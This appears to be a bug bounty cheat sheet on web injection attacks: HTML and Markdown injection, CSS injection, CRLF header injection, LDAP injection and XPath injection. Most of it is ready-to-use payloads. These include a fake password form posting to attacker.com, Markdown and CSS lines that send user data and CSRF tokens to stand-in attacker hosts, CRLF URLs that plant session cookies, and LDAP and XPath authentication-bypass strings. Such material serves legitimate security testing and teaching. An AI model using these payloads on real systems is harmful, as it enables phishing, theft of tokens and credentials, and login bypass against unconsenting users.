# HTML Injection, Content Spoofing, CRLF, LDAP, XPath
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), The Tangled Web (Zalewski), WSTG v4.2

## Table of Contents
1. [HTML Injection & Content Spoofing](#1-html-injection--content-spoofing)
2. [Markdown Injection](#2-markdown-injection)
3. [CSS Injection](#3-css-injection)
4. [CRLF Injection / Header Injection](#4-crlf-injection--header-injection)
5. [LDAP Injection](#5-ldap-injection)
6. [XPath Injection](#6-xpath-injection)

---

## 1. HTML Injection & Content Spoofing

### What It Is
Injecting HTML markup that changes page appearance without executing JavaScript. Less severe than XSS
but enables phishing and social engineering.

### Basic Test
```html
<h1>HACKED</h1>
<b>Bold text</b>
<img src=x>
<a href="https://evil.com">Click here</a>
<form action="https://evil.com/steal">
```
If any HTML renders → HTML injection confirmed.

### Phishing via HTML Injection
```html
<!-- Inject a fake login form on legitimate domain -->
<form method="POST" action="https://attacker.com/steal">
  <h3>Session expired. Please re-enter your password:</h3>
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Continue">
</form>

<!-- Fake urgent alert banner -->
<div style="background:red;color:white;padding:10px;position:fixed;top:0;width:100%">
  Your account has been compromised. <a href="https://evil.com/fix" style="color:white">Click to secure it</a>
</div>

<!-- Redirect notice -->
<p>You are being redirected. <a href="https://evil.com">Click here</a></p>
```

### Content Spoofing Without HTML
```
# When HTML is stripped but text is reflected in error messages:
?error=Your payment was declined. Please update your credit card at attacker.com

# If rendered without encoding:
"Your payment was declined. Please update your credit card at attacker.com"
# Looks like a legitimate error from the site
```

### HTML Injection in Email Templates
```html
Name: <img src="https://attacker.com/pixel.png">   <!-- Tracking pixel -->
Name: <a href="https://attacker.com">Attacker</a>
Name: <form>...</form>
```

### HTML Injection in PDF Reports
```html
<!-- PDFs generated from HTML may execute some HTML -->
<h1>Injected Header</h1>
<iframe src="file:///etc/passwd"></iframe>  <!-- Some PDF generators! -->
```

### Testing Methodology
1. Find all reflection points: everywhere user input is displayed
2. Inject `<b>test</b>` — check if bold rendered
3. Test attributes: `" onclick=alert(1)` — check if escalates to XSS
4. Test forms: `<form action=https://evil.com>` — check phishing potential
5. Test in email context: Is user input in emails? Try HTML in email fields

### Severity
- **Informational**: HTML reflected but no impact
- **Low**: Text content spoofing (no HTML rendered)
- **Medium**: HTML injection enabling phishing (fake login form on legitimate domain)
- **High**: HTML injection on high-trust page (banking, admin), with form phishing

---

## 2. Markdown Injection

Many platforms render Markdown. Even without XSS, Markdown injection can be impactful:

```markdown
# Override heading
[Link text](https://evil.com)
![Alt text](https://attacker.com/pixel.png)     ← Tracking pixel
> Fake blockquote content

# If Markdown allows HTML:
<img src=x onerror=alert(1)>

# Markdown link injection
[click me](javascript:alert(1))

# Markdown image exfiltration
![Profile picture](https://attacker.com/steal?data={user_data})
```

### GFM (GitHub Flavored Markdown) Injection
```markdown
# Anchor injection
[Malicious link](https://evil.com "Hover text")

# Table injection
| Col1 | Col2 |
|------|------|
| legitimate | <script>alert(1)</script> |
```

---

## 3. CSS Injection

CSS injection without JavaScript can leak data.

### Attribute Selector-Based Data Exfiltration (The Tangled Web)
```css
/* Exfiltrate CSRF tokens character by character */
input[name=csrf_token][value^=a] { background: url(https://attacker.com/?c=a); }
input[name=csrf_token][value^=b] { background: url(https://attacker.com/?c=b); }
/* When the correct prefix loads the background → you know the token value */
```

```bash
# Generate CSS exfiltration payloads
for char in {a..z} {A..Z} {0..9}; do
  echo "input[name=csrf_token][value^=${char}] { background: url(https://attacker.com/?c=${char}); }"
done
```

### CSS Expression Injection (IE Only)
```css
/* Internet Explorer — evaluates CSS expressions as JavaScript */
width: expression(alert(1));
background: expression(document.cookie);
```

### CSS Import
```css
/* Load external stylesheet with malicious rules */
@import url('https://attacker.com/malicious.css');
```

### Severity
- **High**: CSS attribute selector exfiltration of CSRF tokens
- **Medium**: CSS import loading attacker-controlled styles

---

## 4. CRLF Injection / Header Injection

If user input ends up in HTTP response headers without proper sanitization, `\r\n` injection
adds new headers or splits the response.

### Detection
```
# Insert %0d%0a in URL parameters that appear in redirect/Location headers
https://target.com/redirect?url=https://google.com%0d%0aSet-Cookie: session=hijacked
https://target.com/redir?url=x%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>

# Test vectors
%0d%0a          → \r\n (CRLF)
%0a             → \n  (LF only — still works in some servers)
%0d             → \r  (CR only)
\r\n            → raw (some servers decode this)
```

### CRLF to Session Fixation
```
https://target.com/login?redirect=%0d%0aSet-Cookie: session=attacker_known_value; Path=/
```

### CRLF to XSS
```
https://target.com/redir?url=x%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### CRLF to Cache Poisoning
```
GET /page?param=value%0d%0aX-Cache-Poison: true HTTP/1.1
Host: target.com
# If injected into Vary header response → cache may store poisoned version
```

### Real-World Examples
- **Shopify** ($500): CRLF in HTTP redirect → inject Set-Cookie → session fixation
- **Twitter** ($3,500): CRLF in URL → arbitrary header injection → XSS

---

## 5. LDAP Injection

### Where to Look
- Corporate login pages, Active Directory integration, user search features
- LDAP-based address books, employee directories

### Test Characters
LDAP metacharacters: `)` `(` `*` `|` `&` `\` `\x00`

### Auth Bypass
```
username: *)(uid=*))(|(uid=*
password: anything

# Result: LDAP filter becomes:
# (&(uid=*)(uid=*))(|(uid=*)(password=anything))
# Always true → auth bypass
```

### Wildcard Enumeration
```
username: a*        → users starting with 'a'
username: admin*    → test if 'admin' user exists
username: *         → returns all users (if no limit)
```

### Blind LDAP (Boolean-Based)
```
# Compare response length/timing for different first characters
username: admin)(|(password=a*)    → TRUE → 'a' not in password
username: admin)(|(password=b*)    → TRUE/FALSE difference
```

### Injection Payloads
```
*
)(uid=*))(|(uid=*
*)(objectClass=*
admin)(&)
admin)(|(password=*)
\2a)(objectClass=*
```

### Testing
```bash
# Inject LDAP metacharacters and observe response differences
curl -s -X POST https://target.com/login \
  -d "username=*)(%26&password=anything" | grep -i "error\|invalid\|found"
```

---

## 6. XPath Injection

### Where to Look
- XML databases, SOAP web services, sites using XPath for user authentication
- Applications that store user data in XML format

### Auth Bypass
```xpath
' or '1'='1
' or 1=1 or ''='
admin' or '1'='1
x' or name()='username' or 'x'='y
' or count(parent::*[position()=1])=0 or 'a'='b
```

### Blind XPath (Boolean-Based)
```xpath
# Extract data character by character
' or substring(//user[position()=1]/password,1,1)='a
' or substring(//user[position()=1]/password,1,1)='b
# Compare response length or timing
```

### Common XPath Injection Payloads
```
' or '1'='1
' or '1'='1'--
" or "1"="1
x' or 1=1 or 'x'='y
'; shutdown;--
' or 1=1 or ''='
' or ''='
1' or '1' = '1
' or 1=1--
```

### Detection
```bash
# Inject single quote and look for XPath errors
curl -s "https://target.com/search?user='" | grep -i "xpath\|expression\|query error"
# XPath error messages:
# "XPath: syntax error"
# "com.sun.org.apache.xpath.internal"
# "javax.xml.xpath"
```
